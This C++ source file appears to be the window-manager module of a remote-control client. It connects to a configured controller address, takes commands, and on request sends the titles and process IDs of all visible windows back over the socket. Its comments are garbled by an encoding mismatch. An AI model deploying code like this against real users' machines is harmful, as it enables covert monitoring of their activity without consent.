#include "WindowManager.h"
#include "Command.h"


bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;

	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	GetWindowText(hwnd, strTitle, sizeof(strTitle));

	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
		return true;


	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);

	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);

	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
	*(LPBYTE *)lParam = lpBuffer;
	return true;
}


void getWindowList(SOCKET windowManagerSocket, LPMsgHead lpMsgHead){
	UINT	nRet = -1;
	LPBYTE	lpBuffer = NULL;
	
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = 1;
	lpMsgHead->dwCmd =  8888;
	lpMsgHead->dwSize = LocalSize(lpBuffer);// strlen((char*)lpBuffer);
	SendMsg(windowManagerSocket, (char*)lpBuffer, lpMsgHead);
	LocalFree(lpBuffer);
}



void windowManager(){
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);

	SOCKET windowManagerSocket = socket(AF_INET, SOCK_STREAM, 0);//���½���һ��ר�ŵ�socket�Ϳͻ��˽��н���
	if(connect(windowManagerSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		closesocket(windowManagerSocket);
		return ;//connect error
	}

	MsgHead msgHead;
	char *chBuffer = new char[1536 * 1024]; //���ݽ����� 1.5MB

	//send socket type 
	msgHead.dwCmd = CMD_WINDOW_MANAGER_DLG_SHOW;
	msgHead.dwSize = 0;
	if(!SendMsg(windowManagerSocket, chBuffer, &msgHead))
	{
		if(chBuffer != NULL)
			delete []chBuffer;

		closesocket(windowManagerSocket);
		return ;//send socket type error
	}
	bool flag = true;
	while(flag)
	{
		//��������
		if(!RecvMsg(windowManagerSocket, chBuffer, &msgHead))
			break;

		//��������
		switch(msgHead.dwCmd)
		{
		case CMD_SHOW_WINDOW_LIST:
			{
				getWindowList(windowManagerSocket, &msgHead);
			}
			break;
		default:
			{
				//::MessageBox(NULL,"����360�������⣡", "����360�������⣡", MB_OK);
			} 
			break;

		}
		memset(chBuffer, 0, 1536 * 1024);
	}
	if(chBuffer != NULL)
		delete[] chBuffer;
	closesocket(windowManagerSocket);
	return ;
}



